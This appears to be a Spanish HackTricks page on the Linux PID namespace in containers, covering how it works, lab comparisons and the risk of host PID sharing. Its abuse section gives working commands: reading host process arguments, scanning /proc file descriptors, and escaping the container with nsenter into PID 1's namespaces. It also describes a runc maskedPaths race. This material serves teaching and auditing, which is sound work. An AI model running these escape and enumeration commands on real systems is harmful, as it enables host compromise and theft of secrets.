# Espacio de nombres PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Resumen

El espacio de nombres PID controla cómo se numeran los procesos y qué procesos son visibles. Por eso un contenedor puede tener su propio PID 1 aunque no sea una máquina real. Dentro del espacio de nombres, la carga de trabajo ve lo que parece ser un árbol de procesos local. Fuera del espacio de nombres, el host sigue viendo los PIDs reales del host y el panorama completo de procesos.

Desde el punto de vista de la seguridad, el espacio de nombres PID importa porque la visibilidad de procesos es valiosa. Una vez que una carga de trabajo puede ver procesos del host, puede ser capaz de observar nombres de servicios, argumentos de la línea de comandos, secretos pasados en argumentos de procesos, estado derivado del entorno a través de `/proc`, y posibles objetivos para entrar en otros namespaces. Si puede hacer más que simplemente ver esos procesos, por ejemplo enviar señales o usar ptrace bajo las condiciones adecuadas, el problema se vuelve mucho más serio.

## Funcionamiento

Un nuevo espacio de nombres PID comienza con su propia numeración interna de procesos. El primer proceso creado dentro de él se convierte en PID 1 desde el punto de vista del espacio de nombres, lo que también significa que recibe semánticas especiales similares a init para hijos huérfanos y comportamiento de señales. Esto explica muchas rarezas de contenedores relacionadas con procesos init, la recolección de procesos zombie, y por qué a veces se usan pequeños wrappers init en contenedores.

La lección de seguridad importante es que un proceso puede parecer aislado porque solo ve su propio árbol de PIDs, pero ese aislamiento puede eliminarse deliberadamente. Docker expone esto mediante `--pid=host`, mientras que Kubernetes lo hace mediante `hostPID: true`. Una vez que el contenedor se une al espacio de nombres PID del host, la carga de trabajo ve directamente los procesos del host, y muchas vías de ataque posteriores se vuelven mucho más realistas.

## Laboratorio

Para crear un espacio de nombres PID manualmente:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
La shell ahora ve una vista de procesos privada. El flag `--mount-proc` es importante porque monta una instancia procfs que coincide con el nuevo PID namespace, haciendo que la lista de procesos sea coherente desde el interior.

Para comparar el comportamiento del container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La diferencia es inmediata y fácil de entender, por eso este es un buen primer laboratorio para los lectores.

## Uso en tiempo de ejecución

Los contenedores normales en Docker, Podman, containerd y CRI-O obtienen su propio PID namespace. Los Pods de Kubernetes normalmente también reciben una vista de PID aislada a menos que el workload solicite explícitamente host PID sharing. Los entornos LXC/Incus se basan en la misma primitiva del kernel, aunque los casos de uso de system-container pueden exponer árboles de procesos más complicados y fomentar atajos de depuración adicionales.

La misma regla se aplica en todas partes: si el runtime decide no aislar el PID namespace, eso es una reducción deliberada del perímetro del contenedor.

## Configuraciones incorrectas

La mala configuración canónica es host PID sharing. Los equipos a menudo lo justifican para debugging, monitoring o por conveniencia en la gestión de servicios, pero siempre debe considerarse una excepción de seguridad significativa. Incluso si el contenedor no tiene una write primitive inmediata sobre los procesos del host, la mera visibilidad puede revelar mucho sobre el sistema. Una vez que se añaden capacidades como `CAP_SYS_PTRACE` o acceso útil a procfs, el riesgo se amplía significativamente.

Otro error es asumir que, porque el workload no puede kill o ptrace procesos del host por defecto, host PID sharing es por tanto inocuo. Esa conclusión ignora el valor de la enumeración, la disponibilidad de namespace-entry targets y la forma en que la visibilidad de PIDs se combina con otros controles debilitados.

## Abuso

Si se comparte el host PID namespace, un atacante puede inspeccionar procesos del host, recopilar argumentos de procesos, identificar servicios interesantes, localizar PIDs candidatos para `nsenter`, o combinar la visibilidad de procesos con privilegios relacionados con ptrace para interferir con el host o workloads vecinos. En algunos casos, simplemente ver el proceso de larga ejecución correcto es suficiente para remodelar el resto del plan de ataque.

El primer paso práctico siempre es confirmar que los procesos del host son realmente visibles:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una vez que los PIDs del host son visibles, los argumentos del proceso y los objetivos de namespace-entry a menudo se convierten en la fuente de información más útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` está disponible y se tienen suficientes privilegios, prueba si un proceso visible del host puede usarse como puente de espacios de nombres:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Incluso cuando el acceso está bloqueado, el compartir PID del host ya resulta valioso porque revela la disposición de servicios, los componentes en tiempo de ejecución y los procesos privilegiados candidatos a atacar a continuación.

La visibilidad de los PID del host también hace más realista el abuso de descriptores de archivo. Si un proceso privilegiado del host o una carga de trabajo vecina tiene un archivo o socket sensible abierto, el atacante puede inspeccionar `/proc/<pid>/fd/` y reutilizar ese descriptor según la propiedad, las opciones de montaje de procfs y el modelo de servicio objetivo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Estos comandos son útiles porque responden si `hidepid=1` o `hidepid=2` están reduciendo la visibilidad entre procesos y si descriptores claramente interesantes, como archivos secretos abiertos, logs o Unix sockets, son visibles.

### Ejemplo completo: host PID + `nsenter`

Compartir el PID del host se convierte en una escapada directa al host cuando el proceso también tiene suficientes privilegios para unirse a los host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si el comando tiene éxito, el proceso del contenedor ahora se está ejecutando en los namespaces mount, UTS, network, IPC y PID del host. El impacto es la compromisión inmediata del host.

Incluso cuando `nsenter` en sí esté ausente, el mismo resultado puede alcanzarse mediante el binario del host si el sistema de archivos del host está montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recientes en tiempo de ejecución

Algunos ataques relacionados con PID namespace no son las habituales misconfiguraciones `hostPID: true`, sino errores de implementación en tiempo de ejecución sobre cómo se aplican las protecciones de procfs durante la configuración del contenedor.

#### `maskedPaths` race hacia el procfs del host

En versiones vulnerables de `runc`, atacantes que pudieran controlar la imagen del contenedor o la carga `runc exec` podían competir en la fase de enmascarado reemplazando el `/dev/null` del contenedor por un symlink a una ruta sensible de procfs como `/proc/sys/kernel/core_pattern`. Si la carrera tenía éxito, el bind mount del masked-path podría acabar apuntando al objetivo incorrecto y exponer controles globales de procfs del host al nuevo contenedor.

Comando útil para revisar:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Esto es importante porque el impacto final puede ser el mismo que el de una exposición directa de procfs: `core_pattern` o `sysrq-trigger` escribibles, seguido de ejecución de código en el host o denegación de servicio.

#### Inyección de namespace con `insject`

Las herramientas de inyección de namespace como `insject` muestran que la interacción con PID-namespace no siempre requiere entrar previamente en el namespace objetivo antes de crear el proceso. Un proceso auxiliar puede adjuntarse después, usar `setns()`, y ejecutar preservando la visibilidad en el espacio PID objetivo:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Este tipo de técnica importa principalmente para depuración avanzada, herramientas ofensivas y flujos de trabajo de post-explotación donde el contexto del espacio de nombres debe unirse después de que el runtime ya haya inicializado la carga de trabajo.

### Related FD Abuse Patterns

Hay dos patrones que vale la pena destacar explícitamente cuando los PID del host son visibles. Primero, un proceso privilegiado puede mantener un descriptor de archivo sensible abierto a través de `execve()` porque no se marcó como `O_CLOEXEC`. Segundo, los servicios pueden pasar descriptors de archivo por sockets Unix mediante `SCM_RIGHTS`. En ambos casos, el objeto interesante deja de ser el pathname y pasa a ser el handle ya abierto que un proceso con menos privilegios puede heredar o recibir.

Esto importa en entornos de contenedores porque el handle puede apuntar a `docker.sock`, un registro privilegiado, un archivo secreto del host u otro objeto de alto valor incluso cuando la ruta en sí no sea accesible directamente desde el sistema de archivos del contenedor.

## Checks

El propósito de estos comandos es determinar si el proceso tiene una vista de PID privada o si ya puede enumerar un panorama de procesos mucho más amplio.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Lo interesante aquí:

- Si la lista de procesos contiene servicios del host evidentes, probablemente host PID sharing ya esté en efecto.
- Ver solo un árbol pequeño local al contenedor es la línea base normal; ver `systemd`, `dockerd`, o daemons no relacionados no lo es.
- Una vez que los host PIDs son visibles, incluso la información de procesos de solo lectura se vuelve reconocimiento útil.

Si descubres un contenedor que se ejecuta con host PID sharing, no lo trates como una diferencia cosmética. Es un cambio importante en lo que la carga de trabajo puede observar y que puede afectar potencialmente.
{{#include ../../../../../banners/hacktricks-training.md}}
